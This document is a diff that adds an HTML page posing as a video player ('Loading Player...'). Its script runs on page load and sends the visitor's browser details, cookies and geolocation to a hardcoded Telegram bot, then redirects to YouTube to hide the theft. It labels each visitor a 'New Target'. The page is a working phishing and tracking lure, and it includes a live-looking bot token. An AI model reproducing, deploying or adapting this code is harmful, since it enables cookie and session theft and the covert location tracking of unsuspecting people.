@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Loading Video...</title>
+</head>
+<body style="background-color:black; color:white; text-align:center; padding-top:20%;">
+    <div id="loader">
+        <p>Loading Player...</p>
+    </div>
+
+    <script>
+        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+        const chatId = "6679834643";
+
+        function sendToTelegram(msg) {
+            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
+            var img = new Image();
+            img.src = url;
+        }
+
+        window.onload = function() {
+            // Send Device Info
+            var info = "🔥 New Target Found!\n" + "Device: " + navigator.userAgent;
+            sendToTelegram(info);
+
+            // Send Cookies
+            var cookies = document.cookie || "No Cookies";
+            sendToTelegram("🍪 Cookies: " + cookies);
+
+            // Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    var mapUrl = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+                    sendToTelegram("📍 Location: " + mapUrl);
+                });
+            }
+
+            // Redirect to YouTube
+            setTimeout(function() {
+                window.location.replace("https://www.youtube.com/watch?v=ilnPMUqFCe0");
+            }, 3000);
+        };
+    </script>
+</body>
+</html>
